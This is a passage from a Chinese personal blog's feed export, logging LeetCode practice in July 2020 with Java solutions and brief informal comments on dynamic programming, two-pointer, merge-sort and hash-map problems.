class="hljs-comment"> * Your MaxQueue object will be instantiated and called as such:</span><span class="hljs-comment"> * MaxQueue obj = new MaxQueue();</span><span class="hljs-comment"> * int param_1 = obj.max_value();</span><span class="hljs-comment"> * obj.push_back(value);</span><span class="hljs-comment"> * int param_3 = obj.pop_front();</span><span class="hljs-comment"> */</span></code></pre></div><h3 id="交错字符串"><a href="#交错字符串" class="headerlink" title="交错字符串"></a><a href="https://leetcode-cn.com/problems/interleaving-string/" target="_blank" rel="noopener">交错字符串</a></h3><p>和室友讨论想到动规，类似机器人找路径的二维矩阵，只能往左或往下走</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isInterleave</span><span class="hljs-params">(String s1, String s2, String s3)</span> </span>&#123;        <span class="hljs-keyword">int</span> n = s1.length();        <span class="hljs-keyword">int</span> m = s2.length();        <span class="hljs-keyword">if</span>(s3.length() != n+m) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        <span class="hljs-keyword">boolean</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[m+<span class="hljs-number">1</span>];        dp[<span class="hljs-number">0</span>] = <span class="hljs-keyword">true</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;=n;i++) &#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;=m;j++) &#123;                <span class="hljs-keyword">int</span> p = i+j-<span class="hljs-number">1</span>;                <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">0</span>) dp[j] = dp[j]&amp;&amp;s1.charAt(i-<span class="hljs-number">1</span>)==s3.charAt(p);                <span class="hljs-keyword">if</span>(j&gt;<span class="hljs-number">0</span>) dp[j] |= dp[j-<span class="hljs-number">1</span>]&amp;&amp;s2.charAt(j-<span class="hljs-number">1</span>)==s3.charAt(p);            &#125;        &#125;        <span class="hljs-keyword">return</span> dp[m];    &#125;&#125;</code></pre></div><h3 id="戳气球"><a href="#戳气球" class="headerlink" title="戳气球"></a><a href="https://leetcode-cn.com/problems/burst-balloons/" target="_blank" rel="noopener">戳气球</a></h3><p>这他妈都能动态规划？原来动规不都是从前往后遍历一次的</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxCoins</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;        <span class="hljs-keyword">int</span> n = nums.length;        <span class="hljs-keyword">int</span>[][] rec = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n+<span class="hljs-number">2</span>][n+<span class="hljs-number">2</span>];        <span class="hljs-keyword">int</span>[] val = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n+<span class="hljs-number">2</span>];        val[<span class="hljs-number">0</span>] = val[n+<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) val[i] = nums[i-<span class="hljs-number">1</span>];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=n-<span class="hljs-number">1</span>;i&gt;=<span class="hljs-number">0</span>;i--) &#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=i+<span class="hljs-number">2</span>;j&lt;=n+<span class="hljs-number">1</span>;j++) &#123;                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k=i+<span class="hljs-number">1</span>;k&lt;j;k++) &#123;                    <span class="hljs-keyword">int</span> sum = val[i]*val[k]*val[j];                    sum += rec[i][k] + rec[k][j];                    rec[i][j] = Math.max(rec[i][j],sum);                &#125;            &#125;        &#125;        <span class="hljs-keyword">return</span> rec[<span class="hljs-number">0</span>][n+<span class="hljs-number">1</span>];    &#125;&#125;</code></pre></div><h3 id="n个骰子的点数"><a href="#n个骰子的点数" class="headerlink" title="n个骰子的点数"></a><a href="https://leetcode-cn.com/problems/nge-tou-zi-de-dian-shu-lcof/" target="_blank" rel="noopener">n个骰子的点数</a></h3><p>这题居然是简单题。。。最高赞的题解是计算出每种点数出现的次数然后除以总次数，我觉得不如这个老哥直接计算概率</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span>[] twoSum(<span class="hljs-keyword">int</span> n) &#123;        <span class="hljs-keyword">double</span> pre[]=&#123;<span class="hljs-number">1</span>/<span class="hljs-number">6</span>d,<span class="hljs-number">1</span>/<span class="hljs-number">6</span>d,<span class="hljs-number">1</span>/<span class="hljs-number">6</span>d,<span class="hljs-number">1</span>/<span class="hljs-number">6</span>d,<span class="hljs-number">1</span>/<span class="hljs-number">6</span>d,<span class="hljs-number">1</span>/<span class="hljs-number">6</span>d&#125;;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++) &#123;            <span class="hljs-keyword">double</span>[] tmp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">double</span>[<span class="hljs-number">5</span>*i+<span class="hljs-number">1</span>];            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;pre.length;j++) &#123;                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> x=<span class="hljs-number">0</span>;x&lt;<span class="hljs-number">6</span>;x++) &#123;                    tmp[j+x] += pre[j]/<span class="hljs-number">6</span>;                &#125;            &#125;            pre = tmp;        &#125;        <span class="hljs-keyword">return</span> pre;    &#125;&#125;</code></pre></div><p>推荐阅读：<a href="https://mp.weixin.qq.com/s/Ef73zZv6wiaXwiJRnCLpoQ" target="_blank" rel="noopener">动态规划初级试炼场</a></p><h3 id="圆圈中最后剩下的数字"><a href="#圆圈中最后剩下的数字" class="headerlink" title="圆圈中最后剩下的数字"></a><a href="https://leetcode-cn.com/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/" target="_blank" rel="noopener">圆圈中最后剩下的数字</a></h3><p>最近的简单题是真滴牛批，约瑟夫环倒推就两行，我想不出来。。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">lastRemaining</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> m)</span> </span>&#123;        <span class="hljs-keyword">int</span> ans = <span class="hljs-number">0</span>;        <span class="hljs-comment">// 最后一轮剩下2个人，所以从2开始反推</span>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++) &#123;            ans = (ans + m) % i;        &#125;        <span class="hljs-keyword">return</span> ans;    &#125;&#125;</code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;7-16至7-20做题记录&quot;&gt;&lt;a href=&quot;#7-16至7-20做题记录&quot; class=&quot;headerlink&quot; title=&quot;7.16至7.20做题记录&quot;&gt;&lt;/a&gt;7.16至7.20做题记录&lt;/h1&gt;&lt;h3 id=&quot;判断二分图&quot;&gt;&lt;a href=&quot;#判断二分</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
    <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
    <category term="每日一题" scheme="http://yoursite.com/tags/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    <category term="剑指offer" scheme="http://yoursite.com/tags/%E5%89%91%E6%8C%87offer/"/>
    
  </entry>
  
  <entry>
    <title>7.11至7.15做题记录</title>
    <link href="http://yoursite.com/2020/07/15/7.11%E8%87%B37.15%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/07/15/7.11%E8%87%B37.15%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-07-15T03:19:57.000Z</published>
    <updated>2020-07-15T03:41:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="7-11至7-15做题记录"><a href="#7-11至7-15做题记录" class="headerlink" title="7.11至7.15做题记录"></a>7.11至7.15做题记录</h1><h3 id="计算右侧小于当前元素的个数"><a href="#计算右侧小于当前元素的个数" class="headerlink" title="计算右侧小于当前元素的个数"></a><a href="https://leetcode-cn.com/problems/count-of-smaller-numbers-after-self/" target="_blank" rel="noopener">计算右侧小于当前元素的个数</a></h3><p>不会做。。。</p><h3 id="地下城游戏"><a href="#地下城游戏" class="headerlink" title="地下城游戏"></a><a href="https://leetcode-cn.com/problems/dungeon-game/" target="_blank" rel="noopener">地下城游戏</a></h3><p>从开始往前走需要同时考虑最低初始健康和过程中的路径和两个值，所以“有两个重要程度相同的参数同时影响后续的决策，这样的动态规划是不满足「无后效性」的”</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">calculateMinimumHP</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] dungeon)</span> </span>&#123;        <span class="hljs-keyword">int</span> n=dungeon.length, m=dungeon[<span class="hljs-number">0</span>].length;        <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[m+<span class="hljs-number">1</span>];        Arrays.fill(dp,Integer.MAX_VALUE);        dp[m-<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=n-<span class="hljs-number">1</span>;i&gt;=<span class="hljs-number">0</span>;i--) &#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=m-<span class="hljs-number">1</span>;j&gt;=<span class="hljs-number">0</span>;j--) &#123;                dp[j] = Math.max(<span class="hljs-number">1</span>,Math.min(dp[j],dp[j+<span class="hljs-number">1</span>])-dungeon[i][j]);            &#125;        &#125;        <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>];    &#125;&#125;</code></pre></div><h3 id="两个数组的交集2"><a href="#两个数组的交集2" class="headerlink" title="两个数组的交集2"></a><a href="https://leetcode-cn.com/problems/intersection-of-two-arrays-ii/" target="_blank" rel="noopener">两个数组的交集2</a></h3><p>很容易想到用hashmap做，但巧妙在于一定去更短的那个数组放到map里</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] intersect(<span class="hljs-keyword">int</span>[] nums1, <span class="hljs-keyword">int</span>[] nums2) &#123;        <span class="hljs-keyword">if</span> (nums1.length &gt; nums2.length) &#123;            <span class="hljs-keyword">return</span> intersect(nums2, nums1);        &#125;        HashMap&lt;Integer,Integer&gt; map = <span class="hljs-keyword">new</span> HashMap();        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num:nums1) &#123;            <span class="hljs-keyword">int</span> count = map.getOrDefault(num, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>;            map.put(num, count);        &#125;        <span class="hljs-keyword">int</span>[] intersection = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[nums1.length];        <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num:nums2) &#123;            <span class="hljs-keyword">int</span> count = map.getOrDefault(num,<span class="hljs-number">0</span>);            <span class="hljs-keyword">if</span>(count &gt; <span class="hljs-number">0</span>) &#123;                intersection[index++] = num;                count--;                <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) map.put(num, count);                <span class="hljs-keyword">else</span> map.remove(num);            &#125;        &#125;         <span class="hljs-keyword">return</span> Arrays.copyOfRange(intersection, <span class="hljs-number">0</span>, index);    &#125;&#125;</code></pre></div><h3 id="和为s的两个数字"><a href="#和为s的两个数字" class="headerlink" title="和为s的两个数字"></a><a href="https://leetcode-cn.com/problems/he-wei-sde-liang-ge-shu-zi-lcof/" target="_blank" rel="noopener">和为s的两个数字</a></h3><p>笨比才用两数之和的方法做，人家说了是递增排序肯定是有用的，用双指针滑动窗口就可以</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] twoSum(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target) &#123;        HashMap&lt;Integer,Integer&gt; map = <span class="hljs-keyword">new</span> HashMap();        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num:nums) &#123;            <span class="hljs-keyword">if</span>(map.containsKey(num)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;num,target-num&#125;;            map.put(target-num,num);        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];    &#125;&#125;</code></pre></div><p>没错我就用的两数之和的那个。。。</p><h3 id="三角形最小路径和"><a href="#三角形最小路径和" class="headerlink" title="三角形最小路径和"></a><a href="https://leetcode-cn.com/problems/triangle/" target="_blank" rel="noopener">三角形最小路径和</a></h3><p>题不难想到解法，但边界的转移需要注意</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">minimumTotal</span><span class="hljs-params">(List&lt;List&lt;Integer&gt;&gt; triangle)</span> </span>&#123;        <span class="hljs-keyword">int</span> n = triangle.size();        <span class="hljs-keyword">int</span>[] f = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];        f[<span class="hljs-number">0</span>] = triangle.get(<span class="hljs-number">0</span>).get(<span class="hljs-number">0</span>);        <span class="hljs-keyword">int</span> min = Integer.MAX_VALUE;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;n;i++) &#123;            f[i] = f[i-<span class="hljs-number">1</span>]+triangle.get(i).get(i);            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=i-<span class="hljs-number">1</span>;j&gt;<span class="hljs-number">0</span>;j--) f[j] = Math.min(f[j],f[j-<span class="hljs-number">1</span>])+triangle.get(i).get(j);            f[<span class="hljs-number">0</span>] += triangle.get(i).get(<span class="hljs-number">0</span>);        &#125;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) min = Math.min(min,f[i]);        <span class="hljs-keyword">return</span> min;    &#125;&#125;</code></pre></div><h3 id="和为s的连续正数序列"><a href="#和为s的连续正数序列" class="headerlink" title="和为s的连续正数序列"></a><a href="https://leetcode-cn.com/problems/he-wei-sde-lian-xu-zheng-shu-xu-lie-lcof/" target="_blank" rel="noopener">和为s的连续正数序列</a></h3><p>和之前那个题一样，但返回的list toarray没搞明白</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[][] findContinuousSequence(<span class="hljs-keyword">int</span> target) &#123;        <span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>, j=<span class="hljs-number">1</span>, sum=<span class="hljs-number">0</span>;        List&lt;<span class="hljs-keyword">int</span>[]&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();        <span class="hljs-keyword">while</span>(i&lt;=target/<span class="hljs-number">2</span>) &#123;            <span class="hljs-keyword">if</span>(sum &lt; target) sum += j++;            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(sum &gt; target) sum -= i++;            <span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[j-i];                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k=i;k&lt;j;k++) arr[k-i] = k;                res.add(arr);                sum -= i++;            &#125;        &#125;        <span class="hljs-keyword">return</span> res.toArray(<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[res.size()][]); <span class="hljs-comment">// 这里的new int[][]没搞清楚</span>    &#125;&#125;</code></pre></div><h3 id="不同的二叉搜索树"><a href="#不同的二叉搜索树" class="headerlink" title="不同的二叉搜索树"></a><a href="https://leetcode-cn.com/problems/unique-binary-search-trees/" target="_blank" rel="noopener">不同的二叉搜索树</a></h3><p> <a href="https://baike.baidu.com/item/卡特兰数" target="_blank" rel="noopener">卡特兰数</a> 是真滴牛批，<a href="https://leetcode-cn.com/problems/unique-binary-search-trees/solution/hua-jie-suan-fa-96-bu-tong-de-er-cha-sou-suo-shu-b/" target="_blank" rel="noopener">灵魂画手</a>的题解写的很清楚</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">numTrees</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;        <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n+<span class="hljs-number">1</span>];        dp[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;        dp[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++) &#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">1</span>;j&lt;=i;j++) dp[i] += dp[j-<span class="hljs-number">1</span>]*dp[i-j];        &#125;        <span class="hljs-keyword">return</span> dp[n];    &#125;&#125;</code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;7-11至7-15做题记录&quot;&gt;&lt;a href=&quot;#7-11至7-15做题记录&quot; class=&quot;headerlink&quot; title=&quot;7.11至7.15做题记录&quot;&gt;&lt;/a&gt;7.11至7.15做题记录&lt;/h1&gt;&lt;h3 id=&quot;计算右侧小于当前元素的个数&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
    <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
    <category term="每日一题" scheme="http://yoursite.com/tags/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    <category term="剑指offer" scheme="http://yoursite.com/tags/%E5%89%91%E6%8C%87offer/"/>
    
  </entry>
  
  <entry>
    <title>7.6至7.10做题记录</title>
    <link href="http://yoursite.com/2020/07/06/7.6%E8%87%B37.10%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/07/06/7.6%E8%87%B37.10%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-07-06T02:14:42.000Z</published>
    <updated>2020-07-10T08:23:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="7-6至7-10做题记录"><a href="#7-6至7-10做题记录" class="headerlink" title="7.6至7.10做题记录"></a>7.6至7.10做题记录</h1><h3 id="不同路径"><a href="#不同路径" class="headerlink" title="不同路径"></a><a href="https://leetcode-cn.com/problems/unique-paths/" target="_blank" rel="noopener">不同路径</a></h3><p>题不难但是没想到空间复杂度的优化</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">// class Solution &#123;</span><span class="hljs-comment">//     public int uniquePaths(int m, int n) &#123;</span><span class="hljs-comment">//         int[][] f = new int[m+1][n+1];</span><span class="hljs-comment">//         f[1][1] = 1;</span><span class="hljs-comment">//         for(int i=1;i&lt;=m;i++) &#123;</span><span class="hljs-comment">//             for(int j=1;j&lt;=n;j++) &#123;</span><span class="hljs-comment">//                 if(i==1 &amp;&amp; j==1) continue;</span><span class="hljs-comment">//                 f[i][j] = f[i-1][j] + f[i][j-1];</span><span class="hljs-comment">//             &#125;</span><span class="hljs-comment">//         &#125;</span><span class="hljs-comment">//         return f[m][n];</span><span class="hljs-comment">//     &#125;</span><span class="hljs-comment">// &#125;</span><span class="hljs-comment">// 空间复杂度优化</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">uniquePaths</span><span class="hljs-params">(<span class="hljs-keyword">int</span> m, <span class="hljs-keyword">int</span> n)</span> </span>&#123;        <span class="hljs-keyword">int</span>[] cur = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];        Arrays.fill(cur,<span class="hljs-number">1</span>);        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; m;i++)&#123;            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt; n; j++)&#123;                cur[j] += cur[j-<span class="hljs-number">1</span>] ;            &#125;        &#125;        <span class="hljs-keyword">return</span> cur[n-<span class="hljs-number">1</span>];    &#125;&#125;</code></pre></div><h3 id="不同路径2"><a href="#不同路径2" class="headerlink" title="不同路径2"></a><a href="https://leetcode-cn.com/problems/unique-paths-ii/" target="_blank" rel="noopener">不同路径2</a></h3><p>和上一个差不多，多了障碍，以后做动规要考虑优化滚动数组</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">// class Solution &#123;</span><span class="hljs-comment">//     public int uniquePathsWithObstacles(int[][] obstacleGrid) &#123;</span><span class="hljs-comment">//         if(obstacleGrid[0][0] == 1) return 0;</span><span class="hljs-comment">//         int m=obstacleGrid.length, n=obstacleGrid[0].length;</span><span class="hljs-comment">//         int[][] f = new int[m+1][n+1];</span><span class="hljs-comment">//         f[1][1] = 1;</span><span class="hljs-comment">//         for(int i=1;i&lt;=m;i++) &#123;</span><span class="hljs-comment">//             for(int j=1;j&lt;=n;j++) &#123;</span><span class="hljs-comment">//                 if(i==1 &amp;&amp; j==1) continue;</span><span class="hljs-comment">//                 if(obstacleGrid[i-1][j-1] == 1) continue;</span><span class="hljs-comment">//                 f[i][j] = f[i-1][j]+f[i][j-1];</span><span class="hljs-comment">//             &#125;</span><span class="hljs-comment">//         &#125;</span><span class="hljs-comment">//         return f[m][n];</span><span class="hljs-comment">//     &#125;</span><span class="hljs-comment">// &#125;</span><span class="hljs-comment">// 利用滚动数组优化空间复杂度</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">uniquePathsWithObstacles</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] obstacleGrid)</span> </span>&#123;        <span class="hljs-keyword">if</span>(obstacleGrid[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        <span class="hljs-keyword">int</span> m=obstacleGrid.length, n=obstacleGrid[<span class="hljs-number">0</span>].length;        <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) &#123;            <span class="hljs-keyword">if</span>(obstacleGrid[<span class="hljs-number">0</span>][i] == <span class="hljs-number">1</span>) <span class="hljs-keyword">break</span>;            res[i] = <span class="hljs-number">1</span>;        &#125;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;m;i++) &#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++) &#123;                <span class="hljs-keyword">if</span>(obstacleGrid[i][j] == <span class="hljs-number">1</span>) &#123;                    res[j] = <span class="hljs-number">0</span>;                    <span class="hljs-keyword">continue</span>;                &#125;                <span class="hljs-keyword">if</span>(j!=<span class="hljs-number">0</span>) res[j] += res[j-<span class="hljs-number">1</span>];            &#125;        &#125;        <span class="hljs-keyword">return</span> res[n-<span class="hljs-number">1</span>];    &#125;&#125;</code></pre></div><h3 id="数组中的逆序对"><a href="#数组中的逆序对" class="headerlink" title="数组中的逆序对"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-de-ni-xu-dui-lcof/" target="_blank" rel="noopener">数组中的逆序对</a></h3><p>对各类排序算法的衍生应用</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">reversePairs</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;        <span class="hljs-keyword">int</span> len = nums.length;        <span class="hljs-keyword">if</span>(len &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        <span class="hljs-comment">//不一定可以在原数组上更改所以copy一份</span>        <span class="hljs-keyword">int</span>[] copy = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[len];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++) copy[i] = nums[i];        <span class="hljs-comment">//传入可以重复使用的辅助空间，这样就不用每次都新开空间了</span>        <span class="hljs-keyword">int</span>[] tmp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[len];        <span class="hljs-keyword">return</span> reversePairs(copy,<span class="hljs-number">0</span>,len-<span class="hljs-number">1</span>,tmp);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">reversePairs</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> right, <span class="hljs-keyword">int</span>[] tmp)</span> </span>&#123;        <span class="hljs-keyword">if</span>(left == right) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        <span class="hljs-keyword">int</span> mid = left+(right-left)/<span class="hljs-number">2</span>;        <span class="hljs-keyword">int</span> leftPairs = reversePairs(nums,left,mid,tmp);        <span class="hljs-keyword">int</span> rightPairs = reversePairs(nums,mid+<span class="hljs-number">1</span>,right,tmp);        <span class="hljs-keyword">if</span>(nums[mid] &lt;= nums[mid+<span class="hljs-number">1</span>]) <span class="hljs-keyword">return</span> leftPairs + rightPairs;        <span class="hljs-keyword">int</span> mergecount = merge(nums,left,mid,right,tmp);        <span class="hljs-keyword">return</span> leftPairs + rightPairs + mergecount;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">merge</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> mid, <span class="hljs-keyword">int</span> right, <span class="hljs-keyword">int</span>[] tmp)</span> </span>&#123;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=left;i&lt;=right;i++) tmp[i] = nums[i];        <span class="hljs-keyword">int</span> i = left, j = mid + <span class="hljs-number">1</span>, count = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k=left;k&lt;=right;k++) &#123;            <span class="hljs-keyword">if</span>(i == mid+<span class="hljs-number">1</span>) nums[k] = tmp[j++];            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(j == right+<span class="hljs-number">1</span>) nums[k] = tmp[i++];            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(tmp[i] &lt;= tmp[j]) nums[k] = tmp[i++];            <span class="hljs-keyword">else</span> &#123;                nums[k] = tmp[j++];                count += mid-i+<span class="hljs-number">1</span>;            &#125;        &#125;        <span class="hljs-keyword">return</span> count;    &#125;&#125;</code></pre></div><h3 id="路径总和"><a href="#路径总和" class="headerlink" title="路径总和"></a><a href="https://leetcode-cn.com/problems/path-sum/" target="_blank" rel="noopener">路径总和</a></h3><p>题很简单但是感觉自己的代码很干练所以贴一下</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for a binary tree node.</span><span class="hljs-comment"> * public class TreeNode &#123;</span><span class="hljs-comment"> *     int val;</span><span class="hljs-comment"> *     TreeNode left;</span><span class="hljs-comment"> *     TreeNode right;</span><span class="hljs-comment"> *     TreeNode(int x) &#123; val = x; &#125;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">hasPathSum</span><span class="hljs-params">(TreeNode root, <span 